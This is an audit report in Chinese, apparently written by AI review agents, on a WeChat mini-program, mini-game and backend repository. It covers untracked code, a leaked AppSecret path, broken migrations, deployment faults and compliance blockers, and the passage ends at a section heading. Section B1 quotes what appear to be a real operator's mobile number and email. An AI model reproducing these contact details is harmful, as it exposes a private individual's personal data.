# 锦鲤游戏项目审查 — 2026-11-10

> 本次审查接续 2026-11-10 上午被中断的同题会话（主代理已完成仓库面调查，派出的 5 路并行代码深审全部卡在「读文件」阶段、一个报告都没产出）。
> 审查对象为当前工作区（**未提交**，HEAD 严重过时），基准提交 `d98ed76`。
> 本轮**未修改任何业务代码**，仅新增本报告。结论均来自源码、现有测试与只读复现，不代表真机或生产环境验收。

**一句话结论：项目能跑、测试基本绿，但「交付态」是坏的——小游戏端 1 万行代码完全没进版本控制，微信 AppSecret 会泄露给普通管理员，新建的数据库一局都结算不了，生产后端下次按现有脚本部署会启动失败，而工作区与公开远端已经脱节 120 天。**

**本次审查规模**

| | |
|---|---|
| 审查方式 | 主代理仓库面调查 + **6 路独立代码级深审**（后端经济 / 后端 HTTP / 小程序前端 / 实时通道 / 小游戏 / 管理后台前端） |
| 确认缺陷 | **90 条**（P0 × 3、P1 × 18、P2 × 48、P3 × 21） |
| 只读复现脚本 | **32 个**（全部在 `/tmp/jinli-audit-*/` 下，未改动仓库任何文件） |
| 交叉验证 | 每日任务缺陷由两路独立复现；Node 崩溃行为、AppSecret 泄露、AppID 原地改、codegen 方向、生成物守卫恒真、后台源码未入库等由主代理二次复核 |
| 三端测试现状 | 小程序 328/327 通过 1 失败 · 后端 173 全过 · 小游戏 73 全过 |
| 报告 | 本文件，`docs/project-audit-2026-11-10.md` |

---

## 0. 最要紧的：小游戏端完全没进版本控制

`minigame/` 是**整个目录 0 个文件被 git 跟踪**（`git ls-files minigame` → 0，`git status` 显示 `?? minigame/`）。

| 事实 | 实测 |
|---|---|
| 未入库文件数 | 79 个（不含 `node_modules/`、`dist/`） |
| 其中 TypeScript / 脚本代码 | **10 054 行** |
| 最近两天仍在改动 | 14 个文件改于 2026-11-09，2 个改于 2026-11-10 |
| 版本控制 | **完全没有** |
| 备份 | **没有**（`.scratch/` 只是部署临时目录，也不受保护） |

**为什么这是 P0：** 这个端是 `AGENTS.md` 里与小程序、后端并列的三大组成之一，`docs/agents/architecture.md` 描述了它，`docs/release/玩法与100秒对局-2026-10-22.md` 用它做三端一致性验收，`docs/project-audit-2026-10-28.md` 的 S1/S2/S3 三条修复全部发生在它身上。**这些修复目前只存在于这一块硬盘上。** 一次误删、一次磁盘故障、一次误操作 `git clean -fd`，小游戏端就永久没了，而且没有任何 diff 可查、没有任何可回滚的版本。

**同类问题还有两处：**

- `assets-pkg/`（小程序运行时素材，9 个文件）—— 0 文件入库、也未 gitignore，详见 **E12**。
- `back/admin-web/src/utils/csv.js` —— 管理后台**唯一**一个未入库的源文件，`UserList.vue:105` 引用它 → 干净检出必然构建失败，详见 **M-2**。

**连带影响：**

1. **CI 在全新 checkout 上必然失败。** `.github/workflows/ci.yml` 有「小游戏安装 / 小游戏测试与类型检查 / 小游戏构建」三步，全都在 `minigame/` 目录下执行。全新 clone 里没有这个目录 → `npm ci` 直接报 `ENOENT ... minigame/package-lock.json`。
2. **`.github/` 自己也完全未入库**（0 个文件），`.nvmrc` 同样未入库 → 公开仓库里**连 CI 配置都没有**，CI 的 `node-version-file: .nvmrc` 也没有来源。
3. `minigame/package-lock.json` 存在于磁盘但未跟踪（因为整个目录未跟踪），CI 用的是 `npm ci`（要求 lock 文件必须入库）。

**修复方向（按优先级）：**

- 先做一次完整备份：`tar` 打包 `minigame/` 到仓库外，或推到一个私有远端。
- 再把 `minigame/`、`minigame/package-lock.json`、`.github/`、`.nvmrc`、`PRODUCT.md`、`back/admin-web/src/utils/csv.js` 正式入库，并确认 `.gitignore` 里的 `minigame/dist/`、`minigame/assets-pkg/` 排除规则仍然生效（构建产物与打包资源**本来就不该入库**）。
- 入库后立刻在 CI 上跑一遍全绿，确认小游戏端不再是「只在本地存在」。

---

## 立即处理（本周内）

| # | 级别 | 问题 | 位置 |
|---|---|---|---|
| **F1** | **P0** | **小游戏端 79 个文件 / 10054 行代码完全未入库，零备份** | `minigame/` |
| **J-1** | **P0** | **微信 AppSecret / AI API Key 以未脱敏的 `config_value` 泄露给普通管理员 → 可接管任意用户账号** | `back/src/utils/admin-presenters.js:68-83` |
| **H-1 / D1** | **P0** | docker-compose 缺 012 → 新建库缺 `daily_tasks` 表 → **整局结算回滚、全服零发奖**、每 50ms 无限重试打库 | `back/docker-compose.yml`、`back/src/services/game-service.js:543` |
| **F2** | **P1** | `.github/`、`.nvmrc` 未入库 → 公开仓库无 CI；CI 的小游戏步骤必然失败 | `.github/workflows/ci.yml` |
| **M-2** | **P1** | `back/admin-web/src/utils/csv.js` 未入库 → 干净检出构建管理后台必然失败 | `back/admin-web/src/utils/csv.js` |
| A1 | **P1** | 生产后端依赖仓库根 `utils/`，部署脚本不部署它 → 下次部署启动即崩 | `back/src/app.js:12`、`back/src/services/release-readiness.js:1` |
| A2 | **P1** | 生产必需环境变量 `DEPLOYMENT_CHANNEL`/`TRIAL_USER_IDS` 不在 `.env.example`、不在文档、不在部署脚本 | `back/src/config/index.js:70-84` |
| B1 | **P1** | `config/operator.smoke.json` 含真实运营主体名+手机号+邮箱，未被忽略 → 会被提交到**公开**仓库 | `config/operator.smoke.json`、`.gitignore` |
| C1 | **P1** | 每日任务页领一个金币后，其余「已完成未领取」任务按钮**永久变灰** | `pages/tasks/index.js:22,43-45,53` |
| E12 | **P1** | 小程序运行时素材全指向 `/assets-pkg/`，该目录 0 文件入库、无生成脚本 → 重建即缺图 | `assets-pkg/` |
| E6 | **P1** | `minigame` 的 codegen 反向改写 `utils/` 与后端引擎源码；一致性守卫恒真 + CI 顺序 → 生成物过期永远测不出来 | `minigame/scripts/generate-run-arena.mjs:6` |
| E1 | **P1** | 本地领先公开远端 1 个提交（未推送）+ 287 项工作区未提交改动，最近提交距今 120 天 | git 仓库状态 |
| J-2 | **P1** | 用户端 JWT 有效期被缩短 1000 倍（默认 10 分钟而非 7 天），后台改 TTL 会短到 3.6 秒 | `back/src/services/auth-service.js:141` |
| K-1 | **P1** | ws 连接回调里未捕获异常 → **后端整个进程退出，所有进行中对局作废** | `back/src/socket/arena-realtime.js:153` |
| K-3 | **P1** | ws 未设 `maxPayload`，未鉴权客户端可把 100 MiB/连接压进内存 | `back/src/socket/arena-realtime.js:82` |
| M-1 | **P1** | 编辑「已发布」公告会被静默改回草稿 → 公告从小程序端消失 | `back/admin-web/src/views/announcements/AnnouncementList.vue:261` |
| I-7 | **P1** | 隐私政策承诺的「撤回隐私授权」在客户端没有入口（对外承诺与实现不一致） | `pages/profile/index.wxml:69-71` |
| **F3** | **P1** | 发布检查判定**禁止公开发布**（实名防沉迷/发行资质/内容安全 Token 等未落地） | `npm run release:check` |

---

## A. 部署与运行时

### A1 · [P1] 生产后端依赖仓库根 `utils/`，而部署脚本只部署 `back/`

- 位置：`back/src/app.js:12` → `back/src/services/release-readiness.js:1`
- 代码：`require('../../../utils/legal-config')`。从 `back/src/services/` 出发，`../../..` 是**仓库根**，即后端在生产环境需要 `back1/utils/legal-config.js`。
- 生产目录结构（`.scratch/backend-deploy-2026-10-28/deploy.py:13`）：`LIVE = /www/www/docker/home/xcx/back1/back`，即 `back1/` 下只有 `back/`。
- 部署脚本（`.scratch/backend-deploy-2026-10-28/prepare.py:17-18`）只拷贝 `src/` 与 `package.json`，**从不拷贝 `utils/`**。
- 触发场景：按现有脚本做一次干净部署 → `back/src/app.js` 启动即 `MODULE_NOT_FOUND` → 宝塔 `back1` 项目起不来 → 整个后端（含联机通道）不可用。当前线上能跑，只是因为 `back1/utils/` 里恰好留着一份旧的、不知道什么时候放的拷贝。
- 修复方向：把 `isReady()` 所需的法律配置下沉到 `back/` 内部（例如 `back/src/config/legal-config.js`），或让部署脚本显式携带 `utils/legal-config.js`；不要让后端跨目录依赖小程序前端的 `utils/`。

### A2 · [P1] 生产必需环境变量没有任何文档，部署脚本也不设置

- 位置：`back/src/config/index.js:70-84`
- `DEPLOYMENT_CHANNEL` 默认值是 `'public'`；`public` 渠道在 `back/src/app.js:12` 触发 `assertPublicReleaseReady()`，而该函数**必然**产生「实名防沉迷」「发行资质」「服务类目」三类阻断项（`release-readiness.js:18-20`）→ 抛错 → 后端拒绝启动。
- 走 `trial` 渠道则强制要求 `TRIAL_USER_IDS` 非空（`config/index.js:82-84`）。
- 实测：这两个键名在 `back/.env.example`、`docs/`、`.scratch/` 部署脚本里**一个都没有**；本地 `back/.env` 里也没有。
- 触发场景：按 `.env.example` 配一台新机器 → 后端启动即 `TRIAL_DEPLOYMENT_BLOCKED`（或 `PUBLIC_RELEASE_BLOCKED`）。当前生产能跑，说明有人手工往线上 `.env` 加了这两行，而这个信息在仓库里没有任何载体。
- 修复方向：把 `DEPLOYMENT_CHANNEL` 与 `TRIAL_USER_IDS` 写进 `.env.example`（含取值含义与「trial 必须配名单」），并在部署脚本里做存在性校验。

### A3 · [P2] 生产 Node 版本落后于 CI 与 `engines` 两代

- 声明端：`package.json` `engines.node >= 24`、`.nvmrc` = 24、CI 用 `node-version-file: .nvmrc`。
- 生产端：`.scratch/backend-deploy-2026-10-28/deploy.py:16` 等 6 处均写死 `/www/server/nodejs/v20.20.2/bin/node`；`docs/release/发布执行记录-2026-10-21.md:8` 也记录「Node.js 20」。
- 已扫描 `back/src`、`minigame/src`、`utils/`、`pages/`，未发现 Node 22+ 专属 API（`registerHooks`/`Promise.withResolvers`/`Object.groupBy`/`import.meta.dirname` 等均无命中），**目前不会直接崩**。
- 但 `docs/project-audit-2026-10-28.md:28,68` 记录的 S3 正是「CI 的 Node 20 跑不了小游戏测试加载器」，当时只把 CI 升到了 24，**生产仍停在 20**。现在测试通过的环境 ≠ 生产运行的环境，这正是上一次出问题的形状。
- 修复方向：生产升到 Node 24（与 CI 一致），或把 `engines` 与 `.nvmrc` 降到 20 并重新评估小游戏测试加载器。

---

## B. 密钥与隐私

### B1 · [P1] 真实运营主体手机号在一个未被忽略的文件里，随时会被提交到公开仓库

- 位置：`config/operator.smoke.json`、`.gitignore`
- 实测内容：`operatorName = 北京市有空帮网络科技有限公司`，`contact = 13001200184；10434812@qq.com`，`configured = true`。
- `.gitignore` 只忽略了 `config/operator.local.json`；**`operator.smoke.json` 与 `operator.example.json` 都没有被忽略**。`git status` 显示 `?? config/`。
- 远端：`origin = git@github.com:10434812/game_codex.git`，`gh repo view` 确认 `visibility: PUBLIC`。
- 触发场景：任何人执行一次 `git add . && git commit && git push` → 真实手机号与邮箱进入**公开**仓库，永久留在历史里。
- 修复方向：`.gitignore` 改为忽略 `config/*.json`（只保留 `operator.example.json` 白名单），或干脆把 `config/` 整体忽略并把示例文件挪到 `docs/`；同时在微信公众平台与工信部备案口径上评估这属于对外暴露的个人信息。

### B2 · [P2] `back/.env` 已在公开仓库的历史中

- 位置：提交 `dd8a794`（2026-05-11）引入，`git cat-file -e origin/main:back/.env` 确认**至今仍在 `origin/main` 上**。
- 键名全部可见：`DB_PASSWORD`/`JWT_SECRET`/`WX_SECRET`/`ADMIN_PASSWORD`/`WX_APPID`/`ADMIN_USERNAME` 等。
- 值已逐项核验：均为**占位符/开发默认值**（长度 8–42，含 `change`/`secret`/`admin` 等特征串），**不是生产真值**，因此没有直接资损。`WX_APPID` 提交的是旧值 `wx72a4b552a87b44cf`，与现用的 `wxd7f500f3f21f15dd` 不同。
- 真实风险有三层：① 完整后端+管理后台+小程序源码在公开仓库；② 公开了口令结构与「用弱默认值」的习惯——任何照抄 `.env.example` 的环境都没有密钥；③ `origin/main` 早于当前工作区 120 天，看到的是**旧版本**，容易被误当作现状。
- 修复方向：工作区已 `git rm --cached back/.env`（暂存区显示 `D`），还需清理历史（`git filter-repo` 或新建干净仓库）；若任何环境沿用过这些占位值，必须轮换。

### B3 · [P2] `.scratch/` 等目录既没被 git 忽略，也没被上传包忽略以外的方式保护

- 位置：`.gitignore`（缺 `.scratch/`）、`.scratch/`（250 个未跟踪文件）
- 内容实测：`prepare.py`/`deploy.py` 部署脚本（含服务器绝对路径、宝塔面板 API 调用）、`schema-before.sql`（建库前的库结构 dump）、`backend-full.log` 等日志。
- 敏感度实测：17 个文件出现 `session_key`/`openid` 字段名，6 个文件出现 `DB_PASSWORD` 字样，**未发现**真实 JWT、真实 Bearer token 或真实手机号值。风险是「将来某次日志里带上了真值」。
- 修复方向：`.gitignore` 增加 `.scratch/`、`design-preview/`、`assets-pkg/`、`.i18n_work/`、`.superpowers/`、`.sisyphus/`；`config/` 只保留白名单示例。

---

## C. 功能缺陷

### C1 · [P1] 每日任务页：领取一个任务后，其余「已完成未领取」任务的按钮永久变灰

- 位置：`pages/tasks/index.js:22`、`pages/tasks/index.js:43-45`、`pages/tasks/index.js:53`
- 复现（本次独立跑通，只读 mock，脚本在 `/tmp/jinli-verify/tasks-repro.js`）：

  ```
  初次加载 : play1=领取/可点  play3=未完成/禁用  team1=领取/可点
  [toast] 获得 50 金币
  领取后   : play1=已领取/禁用  play3=未完成/禁用  team1=领取/禁用   ← team1 应为「可点」
  ```

- 根因链：
  1. `claimReward` 先 `setData({claiming: taskId, tasks: 所有任务 disabled:true})`（43-45 行）。
  2. 随后在 `.then`/`.catch` 里调用 `this.loadTasks()`（49/52 行），此时 `this.data.claiming` **仍为真**。
  3. `loadTasks` 计算 `disabled: Boolean(task.claimed || task.progress < task.target || this.data.claiming)`（22 行）→ `claiming` 为真 → **所有**任务被算成禁用。
  4. `.finally` 只把 `claiming` 清空（53 行），**没有重算 `disabled`**。
- 影响：玩家领一次金币后，当前页面内其它已达成任务全部变灰且无法点击，必须退出页面再进来（`onShow` 重新 `loadTasks`）才恢复。属于「看起来像奖励已全部领完」的静默功能损失。
- 修复方向：把 `claiming` 复位挪到 `loadTasks()` 之前，或在 `finally` 里按同一公式重算 `disabled`；更稳妥的做法是不要在 `loadTasks` 里读 `this.data.claiming`，改用独立的 `claimingId` 字段并在 `loadTasks` 完成后清空。

### C2 · [P2] 前端测试红：断言未跟随页面数据结构更新

- 位置：`tests/daily-tasks-page.test.js:31`
- 页面 `loadTasks` 现在给每个任务附加 `buttonText`、`disabled`、`isLoading` 三个字段，测试仍用 `assert.deepEqual(page.data.tasks, tasks)` 与 4 字段的原始对象比较 → `AssertionError`。
- 实测：根目录 `npm test` → `tests 328 / pass 327 / fail 1`，唯一失败项即此。
- 影响：CI 在当前工作区必然是红的；也让「测试全绿」这句话不再成立。
- 修复方向：更新断言（比较 `id/progress/target/claimed` 四个语义字段，或整体更新期望对象）；顺带把 C1 的回归写成断言。

---

## D. 数据库与迁移

### D1 · [P0] docker-compose 挂载的迁移缺 011/012/013，新库会缺 `daily_tasks` 表

> **完整分析见 H-1**（含复现 SQL 轨迹、50ms 无限重试、内存泄漏）。此处只保留仓库面视角。

- 位置：`back/docker-compose.yml`（volumes 段只到 `010_simulated_fortune_only.sql`）
- 缺失：`011_game_duration_100.sql`、`012_daily_tasks.sql`、`013_game_duration_120.sql`。
- 代码里 `daily_tasks` 表被 `back/src/services/daily-task-service.js` 直接读写（表名出现在 `back/src/services/*.js` 与 `back/src/routes/tasks.js` 的 SQL 中）。
- 触发场景：按 `docker-compose up` 建一个新库 → 表 `daily_tasks` 不存在 → 每日任务接口直接抛「表不存在」，前端 `/tasks` 报错；`pages/tasks/index.js:31` 已经预留了 404 提示，但这里是 500。
- 附带发现：`011` 把 `game_sessions.duration` 默认改成 100、`013` 又改回 120，而 `001` 的默认值本来就是 120 → **`011` 是无效迁移**，只是把同一个字段改过去再改回来；`011` 与 `013` 都不在 compose 挂载里反而避免了执行顺序上的坑。
- 修复方向：把 011/012/013 加入 compose 挂载并删掉 011；更彻底的做法是引入一个按编号顺序执行的迁移器（现在 `back/` 里没有任何自动迁移入口，`grep -rn "sql/" back/src` 无命中，只能手工执行）。

### D2 · [P3] 迁移编号重复

- `back/sql/007_disable_payment_and_external_reality.sql` 与 `back/sql/007_room_playing_unique.sql` 同为 `007`；编号序列缺 `006`。
- 影响：按编号排序执行时顺序不确定（当前两个 007 内容互不冲突，暂时无害），但迁移工具无法可靠排序。

---

## E. 仓库卫生与交付风险

### E1 · [P1] 工作区与公开远端严重脱节

- `git status --porcelain` 共 **287** 项：`168 M` / `24 D` / `95 ??`（未跟踪）。
- 当前分支 `recovery/final-20260527`，相对 `origin/main`：**领先 1 个提交、落后 0 个** → 那 1 个提交（`d98ed76 recovery: restore final completed mini program version`）**从未推送**。
- 最近一次提交时间 `2026-07-13 11:15:41`，距今 **120 天**；另有 4 个 stash（`stash@{0..3}`，2026-07-13）。
- 影响：线上/可交付状态与本地完全不同；`git stash`、`git checkout`、`git clean` 任一误操作都可能丢掉 287 项工作中的一部分，而这些工作没有任何远端副本。
- 修复方向：先把工作区切成若干可构建的提交并推到一个**私有**远端，再谈公开仓库的处理。

### E2 · [P2] 一批目录既不在 `.gitignore`，也不在 `.gitignore` 的补充名单里

实测 `git check-ignore` 全部返回「未被忽略」：

| 路径 | 风险 |
|---|---|
| `config/operator.smoke.json` | 真实手机号/邮箱（见 B1） |
| `.scratch/` | 250 个文件：部署脚本、服务器绝对路径、库结构 dump、日志 |
| `design-preview/` | 设计预览产物 |
| `assets-pkg/` | 资源打包产物（与 `assets-opt/` 已被忽略的策略不一致） |
| `.i18n_work/` | 翻译中间产物 |
| `.superpowers/`、`.sisyphus/` | 工具状态与历史会话 JSON |

### E3 · [P2] 已跟踪 33 个工具产物文件

- `.sisyphus/` 17 个（含 `run-continuation/ses_*.json` 历史会话、`全局.md`）、`.i18n_work/` 13 个（翻译分片 JSON）、`.superpowers/` 4 个（brainstorm 产物与 `state/server-info`）。
- 这些文件对协作没有价值，却让公开仓库暴露历史工作痕迹。

### E4 · [P2] 公开仓库跟踪 130.6 MB 资源，其中含 AI 生成素材

- `git ls-tree -r -l HEAD` 合计 130.6 MB，`.git` 目录 154 MB。
- `素材/` 下 9 个文件名为 `ChatGPT Image 2026年5月13日 11_53_57 (2).png` 一类；`assets/素材/环形光圈/` 另有 27 张；`assets/stitch_wechat_mini_program_clone/` 是 Stitch 生成的设计稿；`assets/111/code.html` 是 5.7 MB 的 Tailwind 设计预览页。
- 风险：① 仓库体积（公开仓库 clone 成本）；② **AI/Stitch 生成素材的商用授权不明确**——`npm run release:check` 的「人工验收」里本来就列了「素材授权」，这是真实的过审风险；③ 这些产物目录本不属于运行时资源。

### E5 · [P2] `pages/` 下有两份过期工程配置，会被打进上传包

- 位置：`pages/project.config.json`、`pages/project.private.config.json`（均已被 git 跟踪）
- 与根目录同名文件对比，`pages/project.config.json` 是一份**旧副本**：`packOptions` 里写的是 `"../assets"`、`"../素材"`，而根目录那份已经改成 `.scratch`/`assets-opt`/`assets` 等。
- `project.config.json` 的 `packOptions.ignore` 里**没有**排除 `pages/project.config.json` → 它会被打进小程序上传包。
- 风险：微信开发者工具若误用 `pages/` 下的配置，资源路径全部错位。

### E6 · [P1] `minigame` 的 codegen 会反向改写小程序前端与后端引擎源码，且一致性守卫是恒真的

> 完整分析见 **L-2 / L-3**（含沙箱实测与 CI 步骤顺序）。此处只保留仓库面视角。

- 位置：`minigame/scripts/generate-run-arena.mjs:6-12`
- 该脚本把 `minigame/src/core/RunArena.ts`、`minigame/src/render/arena-effects.ts`、`minigame/src/render/run-arena-renderer.ts` 转译后**写回** `utils/run-arena.js`、`utils/arena-effects.js`、`utils/run-arena-renderer.js`、`back/src/game-engine/run-arena.js`。
- 而 `minigame/package.json` 的 `test` 脚本 = `npm run codegen && node --test ...` → **跑一次小游戏测试就会改动 4 个生产源码文件**（沙箱实测：手工往 `utils/run-arena.js` 加的注释被静默抹掉）。
- 与 `AGENTS.md` 的约定存在张力：文档把 `utils/*.js` 描述为需要人工双端同步的「源」，但这 3 个文件其实是生成物；**生成方向恰好与文档描述相反**（真源在 `minigame/src`）。
- 更糟的是：`minigame/tests/run-arena-parity.test.ts` 加载的正是同一次 `npm test` 里 codegen 刚写出的文件 → **「三端一致」永远成立**；而 CI 的步骤顺序是「先测小程序端与后端（用旧产物）→ 最后才跑小游戏 codegen」→ 生成物过期永远检测不出来，CI 全绿而两端行为已静默分叉。
- 修复方向：在 `AGENTS.md` / `architecture.md` 里标注哪些 `utils/` 文件是生成物、生成方向是什么；把 CI 改成「先 codegen → 再 `git diff --exit-code` → 再跑三端测试」。

### E7 · [P3] 文档漂移

- `docs/agents/architecture.md` 的路由表缺 `pages/legal/privacy/index`、`pages/legal/agreement/index`、`pages/tasks/index`；后端结构表仍写着 `src/jobs/`（该目录不存在）。
- `docs/agents/testing.md` 只列了 18 个前端测试文件，实际有 **26** 个（新增 `daily-tasks-page`、`privacy-consent`、`runtime-config`、`release-config`、`run-arena`、`running-page`、`boot-privacy`、`arena-feedback`、`arena-view-performance` 等均未收录）。

### E8 · [P3] `.env.example` 与代码实际依赖不一致

- **代码在读但模板里没有**：`CORS_ORIGIN`、`DEPLOYMENT_CHANNEL`、`OPENCODEGO_PROVIDER`、`OPENCODEGO_TIMEOUT_MS`、`TRIAL_USER_IDS`（前两个直接决定生产能否启动，见 A2）。
- **模板里有但代码没读**：`ADMIN_JWT_SECRET`（其实 `config/index.js:65` 在读，模板写了但校验规则未提）、`CDN_BASE_URL`、`FORTUNE_REALITY_JOB_ENABLED`、`FORTUNE_REALITY_JOB_INTERVAL_MS`、`JWT_SECRET`（出现在「未使用」是因为扫描脚本只统计了 `process.env.X` 字面量，实际通过 `requireStrongSecret(name)` 间接读取，属扫描误报，模板本身是对的）。

### E9 · [P3] 管理后台 `dist` 已被删除且早于 `src`

- `git status` 显示 `back/admin-web/dist/**` 全部 staged 为 `D`，同时 `.gitignore` 新增了 `back/admin-web/dist/`。
- `npm run release:check` 的部署提醒：「后台：dist 早于 src 最后修改，部署前请重新构建管理后台。」——按现状部署会拿到旧后台或没有后台。

### E10 · [P3] 双份引擎已出现漂移

- `utils/investment.js` 与 `back/src/game-engine/investment.js` 相差 6 行：`utils` 版导出 `randomInt`、`randomPick`，后端版没有；另有若干写法差异（空数组判断展开为多行）。
- `constants.js`/`game-engine.js`/`progression.js`/`achievement-medals.js`/`run-arena.js` 当前完全一致。`minigame/tests/engine-parity.test.ts` 覆盖三端 120 秒一致性，但 `investment` 的导出差异说明两端口径已经不完全相同。

### E11 · [P2] 系统配置中心有 7 个配置项**保存后对运行期完全无效**（运营改了以为生效）

- 位置：`back/src/config/system-config-definitions.js`、`back/admin-web/src/views/configs/SystemConfig.vue`
- 这 7 个键除了配置定义本身、`admin-config-service` 和管理后台页面之外，**没有任何运行期代码读取**：

  | 配置键 | 全仓命中（除定义文件与后台页面） | 真实来源 |
  |---|---|---|
  | `game.round_duration` | **0**（唯一 1 处命中是后台页面自己） | 硬编码常量 `back/src/game-engine/constants.js:4` = 120 |
  | `game.min_players` | 0 | 硬编码常量 |
  | `game.max_players` | 0 | 硬编码常量 |
  | `game.team_size` | 0 | 硬编码常量 |
  | `game.daily_signin_coins` | 0 | 硬编码常量 |
  | `shop.refresh_interval` | 0 | 硬编码常量 |
  | `fortune.refresh_interval_seconds` | 3（均不参与定时调度） | 硬编码常量 |

- 主代理独立复核：`grep -rn "game.round_duration" back/src utils pages minigame/src back/admin-web/src` 排除定义文件后**只命中 1 处** —— `back/admin-web/src/views/configs/SystemConfig.vue:241` 的页面默认草稿本身。**没有任何运行期代码读它。**
- 触发场景：运营在「系统配置中心 → 游戏配置」把「每局游戏时长」从 120 改成 60 → 保存成功、列表回显 60、页面无任何报错 → **实际对局仍是 120 秒**。同理「最少/最多玩家数」「每队人数」「每日签到金币」「商城刷新间隔」。
- 加重因素：`back/sql/013_game_duration_120.sql` 做的事恰恰相反 —— 把常量**写回**配置表（`UPDATE system_configs SET config_value='120'`），方向完全倒置。
- 修复方向：要么让三端真正读这个配置（服务端下发 + 客户端采用），要么把它们从 `CONFIG_DEFINITIONS` 里删掉（避免虚假控制），并清理 `011`/`013` 这两个无效迁移。

### E12 · [P1] 小程序的运行时素材全部指向 `/assets-pkg/`，而该目录 0 个文件进版本控制、无生成脚本

- 位置：`pages/arena/index.wxml:2`、`utils/constants.js:186,215`、`utils/runtime-config.js:12,14`、`utils/arena-effects.js:8-14`
- 引用点（共 **9 个资源文件、10 处引用**，全部是**本地绝对路径**，不是 CDN）：

  | 引用位置 | 资源 |
  |---|---|
  | `pages/arena/index.wxml:2` | `/assets-pkg/bg/gamebg.jpg`（对战页主背景） |
  | `utils/constants.js:186,215` | `/assets-pkg/stages/xihu.jpg`、`/assets-pkg/stages/gulangyu.jpg`（两个景区封面） |
  | `utils/runtime-config.js:12,14` | `/assets-pkg/bg/screen.jpg`（分享图 / 朋友圈分享图） |
  | `utils/arena-effects.js:8-14` | 炸弹、福袋、礼盒等 5 个特效贴图 |

- 状态实测：`git ls-files assets-pkg` → **0**；`git check-ignore assets-pkg` → **未忽略**（既没进版本控制，也没被忽略）；目录里 10 个文件（9 个资源 + 1 个 `.DS_Store`）。
- 风险：
  1. **零备份**。与 `minigame/` 同一个病，只是这次影响的是**小程序已上线**的对战页背景、景区封面、分享图和全部特效。
  2. **上传包强依赖它**。`project.config.json` 的 `packOptions.ignore` 只排除了 `assets-pkg/.DS_Store`，**没有排除 `assets-pkg` 本身** → 上传包确实包含这 10 个文件。也就是说，**一旦这个目录丢失，从 git 重新拉取代码打出来的包就是缺图的**：对战页背景裂、两个景区封面裂、分享图裂、特效全丢。交付/换机/重建都会踩。
  3. **状态混乱**。因为它既没被跟踪也没被忽略，`git add .` 会把 9 张图 + 1 个 `.DS_Store` 一起提交，而 `.gitignore` 里又没有「不要提交产物」的规则。
- 与 `minigame/` 的对比：小游戏侧的 `minigame/assets-pkg/` **有**生成流程（`minigame/scripts/copy-stage-assets.mjs`，由 `npm run codegen` 触发）且被 gitignore；小程序侧这个根目录 `assets-pkg/` **没有任何生成脚本**（`scripts/` 下只有语音生成、资源 URL 更新、recovery 三类），是纯手工产物。
- 修复方向：给 `assets-pkg/` 加生成脚本并纳入 `.gitignore`（与 `assets-opt/` 策略一致），或直接把入库改为「入库 + 不忽略」；同时在 `packOptions.include` 里显式列出这些资源，避免将来有人调整 ignore 规则时无声丢图。

### E13 · [P2] 对局时长存在四方不一致：生产 180 / 迁移 100→120 / 代码 120 / 文档 100

| 来源 | 时长 |
|---|---|
| 生产线上（旧引擎，未切换） | **180 秒** |
| `back/sql/011_game_duration_100.sql` | 100 秒（改的是无效配置，见 E11） |
| `back/sql/013_game_duration_120.sql` | 120 秒（同上，无效） |
| 三端代码常量 | **120 秒**（`utils/constants.js:4`、`minigame/src/core/Constants.ts:13`、`back/src/game-engine/constants.js:4`） |
| `docs/release/玩法与100秒对局-2026-10-22.md` | **100 秒**，且写「每 3 秒结算一回合，共 33 回合」 |
| `docs/release/跑动接福验收-2026-10-22.md:47` | 「连续运行 100 秒」 |

- 生产为 180 秒的证据：`.scratch/online-compatibility-2026-10-28/final-preparation/README.md:32`：「`011_game_duration_100.sql` 尚未在生产执行。**旧线上引擎仍使用 180 秒**，保持配置一致……不得遍历执行所有 SQL 文件。」`production-migration-plan.md:15` 同义。
- 即：**仓库代码（120 秒）与线上运行版本（180 秒）不是同一份行为**，且中间没有任何一次发布的验收记录覆盖这个差异。三端一致性测试只保证三份源码互相一致，不保证与线上一致。
- 文档侧 100 秒 / 33 回合的说法已与实现（120 秒 / 40 回合，`game-service.js:405` 每 3 秒一回合）矛盾，会误导后续开发与验收。
- 修复方向：把时长变更收敛为单一事实源并补一份变更记录；在切换生产前，用同一次构建同时验证「线上版本」与「仓库版本」的对局回合数。

---

## F. 上线合规

`npm run release:check`（本地只读、不联网）当前判定：

**禁止正式公开发布（小程序 6 项 / 小游戏 5 项）**

- 服务类目：当前账号为商业服务类目，现有对战内容需完成平台类目与准入确认。
- 实名防沉迷：尚未接入并验收真实渠道能力；微信登录、游客模式、适龄提示均不能替代。
- 发行资质：需取得并核验运营主体、适用出版审批、平台类目和备案材料。
- 内容安全：`WX_CONTENT_SAFETY_TOKEN` / `WX_CONTENT_SAFETY_AES_KEY` / `WX_CONTENT_SAFETY_BASE_URL` 三项均未配置，且还需在微信后台配置真实回调并验收。

**人工验收仍需**：出版/备案材料、平台权限、实名防沉迷实接、内容审核真实回调、素材授权、备份恢复、双设备对局。

**部署提醒**：后台 dist 早于 src，部署前需重新构建管理后台。

`utils/legal-config.js` 侧是健康的：`isReady() = true`，运营主体/联系方式/生效日期/版本号齐备，正文里已无「待填写」占位（10 段隐私 + 10 段协议）。**法务文案不是当前的卡点，卡点在微信侧的配置与资质。**

---

## G. 测试与依赖现状

| 项目 | 命令 | 结果 |
|---|---|---|
| 小程序 | `npm test` | **328 项，327 通过，1 失败**（C2） |
| 后端 | `cd back && npm test` | 173 项全通过 |
| 小游戏 | `cd minigame && npm test` | 73 项全通过 |

- 依赖安全：`npm audit --omit=dev` 在 `back`、`back/admin-web`、`minigame` 均为 **0 漏洞**；含 devDependencies 时 `back` 有 2 个 moderate。
- CI（`.github/workflows/ci.yml`）覆盖三端测试 + 生产依赖审计门禁 + 小游戏构建与类型检查，**但只监听 `push` 到 `main`/`master`**；当前分支 `recovery/final-20260527` 从未推送，HEAD 领先 `origin/main` 1 个提交 → **CI 现状是红的，且从未验证过当前工作区**。

---

## H. 代码级深审 · 后端对局经济 / 房间 / 金币 / 每日任务 / 数据库迁移

> 由独立审计代理完成，覆盖 `back/src/services/{room,game,game-actions,shop,daily-task,fortune-reality,stats}-service.js`、`back/src/game-engine/*`、`back/src/routes/{rooms,games,shop,tasks,leaderboard,stats}.js`、`back/src/models/db.js`、`back/sql/*.sql`、`back/docker-compose.yml`。
> 验证方式：`cd back && npm test`（173/173 通过）+ 用桩 DB 只读复现（脚本在 `/tmp/jinli-audit-game/`），未连真实 MySQL、未访问外网。

